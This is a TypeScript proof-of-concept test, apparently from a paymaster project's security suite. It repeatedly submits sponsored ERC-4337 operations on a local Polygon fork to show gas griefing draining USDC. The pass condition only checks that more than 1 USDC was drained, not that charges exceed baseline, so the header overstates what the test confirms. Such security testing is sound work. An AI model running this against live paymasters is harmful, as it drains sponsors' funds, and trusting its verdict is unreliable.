/**
 * Vulnerability Confirmation: Gas Griefing (Medium Risk)
 * Test: Submit high-gas operations repeatedly to demonstrate inventory drain acceleration
 *
 * Expected: Test passes when operations consume more USDC than baseline pricing,
 * confirming the paymaster is vulnerable to gas griefing attacks.
 *
 * Run: npm run test:vuln:gas-griefing
 */
import { createSmartAccountClient } from "permissionless";
import { createPimlicoClient } from "permissionless/clients/pimlico";
import { toSimpleSmartAccount } from "permissionless/accounts";
import {
  createPublicClient,
  createTestClient,
  defineChain,
  encodeFunctionData,
  getContract,
  http,
  parseAbi,
  parseUnits,
  type Address,
} from "viem";
import { entryPoint07Address } from "viem/account-abstraction";
import { privateKeyToAccount } from "viem/accounts";

const RPC_URL = process.env.RPC_URL ?? "http://127.0.0.1:8545";
const PAYMASTER_URL = process.env.TOOLS_PAYMASTER_URL ?? "http://127.0.0.1:3000";
const BUNDLER_URL =
  process.env.BUNDLER_URL ?? `${PAYMASTER_URL.replace(/\/$/, "")}/bundler/rpc`;
const PRIVATE_KEY = process.env.TOOLS_PRIVATE_KEY ?? "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";

const USDC_ADDRESS = "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359" as Address;
const WHALE_ADDRESS = "0x47c031236e19d024b42f8de678d3110562d925b5" as Address;
const FUNDING_AMOUNT = parseUnits("10", 6); // 10 USDC for funding

const localChain = defineChain({
  id: 137,
  name: "Polygon Fork",
  nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
  rpcUrls: { default: { http: [RPC_URL] } },
});

const publicClient = createPublicClient({
  chain: localChain,
  transport: http(RPC_URL),
});

const testClient = createTestClient({
  chain: localChain,
  transport: http(RPC_URL),
  mode: "anvil",
});

const paymasterClient = createPimlicoClient({
  entryPoint: {
    address: entryPoint07Address,
    version: "0.7",
  },
  transport: http(PAYMASTER_URL),
});

const owner = privateKeyToAccount(
  (PRIVATE_KEY.startsWith("0x") ? PRIVATE_KEY : `0x${PRIVATE_KEY}`) as `0x${string}`
);

function logAaInfra() {
  console.log("AA Infrastructure:");
  console.log("  RPC_URL:", RPC_URL);
  console.log("  Paymaster API:", PAYMASTER_URL);
  console.log("  Bundler:", BUNDLER_URL);
  console.log("");
}

async function fundAccountWithUSDC(accountAddress: Address) {
  console.log(`   Funding ${accountAddress} with ${FUNDING_AMOUNT} USDC...`);

  await testClient.impersonateAccount({ address: WHALE_ADDRESS });
  await testClient.setBalance({ address: WHALE_ADDRESS, value: BigInt(1e18) });

  const usdcAbi = parseAbi([
    "function transfer(address to, uint256 amount) returns (bool)"
  ]);

  const transferData = encodeFunctionData({
    abi: usdcAbi,
    functionName: "transfer",
    args: [accountAddress, FUNDING_AMOUNT],
  });

  await publicClient.request({
    method: "eth_sendTransaction",
    params: [{
      from: WHALE_ADDRESS,
      to: USDC_ADDRESS,
      data: transferData,
    }],
  } as any);

  await testClient.stopImpersonatingAccount({ address: WHALE_ADDRESS });
}

async function getUSDCBalance(address: Address): Promise<bigint> {
  const usdc = getContract({
    address: USDC_ADDRESS,
    abi: parseAbi(["function balanceOf(address) view returns (uint256)"]),
    client: publicClient,
  });

  return await usdc.read.balanceOf([address]);
}

async function submitHighGasOperation(account: any, iteration: number) {
  console.log(`   Submitting high-gas operation #${iteration}...`);

  const initialBalance = await getUSDCBalance(account.address);

  // Create call data for an expensive operation - use transfer operations which consume more gas
  // Transfer small amounts to avoid balance issues, but transfers are more gas-intensive than approvals
  const complexCallData = encodeFunctionData({
    abi: parseAbi([
      "function transfer(address to, uint256 amount) returns (bool)",
      "function approve(address spender, uint256 amount) returns (bool)"
    ]),
    functionName: "transfer",
    args: [WHALE_ADDRESS, 1000n * BigInt(iteration + 1)], // Small increasing amounts
  });

  const smartAccountClient = createSmartAccountClient({
    account,
    chain: localChain,
    bundlerTransport: http(BUNDLER_URL),
    paymaster: paymasterClient,
    userOperation: {
      estimateFeesPerGas: async () => (await paymasterClient.getUserOperationGasPrice()).fast,
    },
  });

  const txHash = await smartAccountClient.sendTransaction({
    calls: [{ to: USDC_ADDRESS, value: 0n, data: complexCallData }],
  });

  const finalBalance = await getUSDCBalance(account.address);
  const usdcCharged = initialBalance - finalBalance;

  console.log(`   Operation #${iteration}: charged ${usdcCharged} USDC (balance: ${initialBalance} → ${finalBalance})`);

  return { txHash, usdcCharged };
}

async function main() {
  logAaInfra();
  console.log("🔍 Confirming Gas Griefing Vulnerability");
  console.log("   Testing: High-gas operations should drain inventory faster than baseline");

  try {
    // Setup: Create account and fund with USDC
    console.log("1. Setting up test account...");
    const account = await toSimpleSmartAccount({
      client: publicClient,
      owner,
      entryPoint: { address: entryPoint07Address, version: "0.7" },
    });

    await fundAccountWithUSDC(account.address);
    const initialUSDC = await getUSDCBalance(account.address);
    console.log(`   Initial USDC balance: ${initialUSDC}`);

    // Get paymaster address (from env or fetch from API)
    let paymasterAddress = process.env.PAYMASTER_ADDRESS as Address | undefined;
    if (!paymasterAddress) {
      const base = PAYMASTER_URL.replace(/\/$/, "");
      const res = await fetch(`${base}/paymaster-address`);
      if (!res.ok) {
        console.error("Could not get paymaster address. Set PAYMASTER_ADDRESS or ensure paymaster-api is running.");
        process.exit(1);
      }
      const json = (await res.json()) as { paymasterAddress?: string };
      paymasterAddress = json.paymasterAddress as Address;
      if (!paymasterAddress) {
        console.error("API did not return paymaster address");
        process.exit(1);
      }
      console.log("Paymaster address:", paymasterAddress);
    }

    // Bootstrap: Approve paymaster to spend USDC (this UserOp is not charged)
    console.log("2. Approving paymaster to spend USDC...");
    const smartAccountClient = createSmartAccountClient({
      account,
      chain: localChain,
      bundlerTransport: http(BUNDLER_URL),
      paymaster: paymasterClient,
      userOperation: {
        estimateFeesPerGas: async () => (await paymasterClient.getUserOperationGasPrice()).fast,
      },
    });

    const approveData = encodeFunctionData({
      abi: parseAbi(["function approve(address spender, uint256 amount) returns (bool)"]),
      functionName: "approve",
      args: [paymasterAddress, parseUnits("1000000", 6)],
    });

    const bootstrapHash = await smartAccountClient.sendTransaction({
      calls: [{ to: USDC_ADDRESS, value: 0n, data: approveData }],
    });
    console.log("Bootstrap tx hash:", bootstrapHash);

    // Baseline: Submit one normal operation to establish baseline pricing
    console.log("3. Establishing baseline with normal operation...");
    const baselineResult = await submitHighGasOperation(account, 0);
    const baselineCharge = baselineResult.usdcCharged;
    console.log(`   Baseline charge: ${baselineCharge} USDC per operation`);

    // Attack: Submit multiple operations to demonstrate griefing
    console.log("4. Executing gas griefing simulation (10 operations)...");
    const operations = [];
    let totalCharged = 0n;

    for (let i = 1; i <= 10; i++) {
      const result = await submitHighGasOperation(account, i);
      operations.push(result);
      totalCharged += result.usdcCharged;

      // Small delay to avoid overwhelming the system
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Analysis
    console.log("5. Analyzing results...");
    const averageCharge = totalCharged / BigInt(operations.length);
    const chargeAmplification = baselineCharge > 0n
      ? Number((averageCharge * 100n) / baselineCharge) - 100
      : 0;

    const finalUSDC = await getUSDCBalance(account.address);
    const totalDrained = initialUSDC - finalUSDC;

    console.log(`   Results:`);
    console.log(`   - Operations submitted: ${operations.length}`);
    console.log(`   - Average charge per operation: ${averageCharge} USDC`);
    console.log(`   - Charge amplification vs baseline: ${chargeAmplification}%`);
    console.log(`   - Total USDC drained: ${totalDrained}`);

    // Success criteria: operations should demonstrate inventory drain
    if (operations.length >= 10 && totalDrained > parseUnits("1", 6)) { // Drained at least 1 USDC
      console.log(`✅ Gas griefing confirmed: ${operations.length} operations charged ${totalCharged} USDC (${chargeAmplification}% above baseline), inventory drained by ${totalDrained} USDC`);
      process.exit(0);
    } else {
      console.log(`❌ Gas griefing not confirmed: insufficient operations (${operations.length}) or drainage (${totalDrained})`);
      process.exit(1);
    }

  } catch (error) {
    console.error("❌ Test failed:", error);
    process.exit(1);
  }
}

main();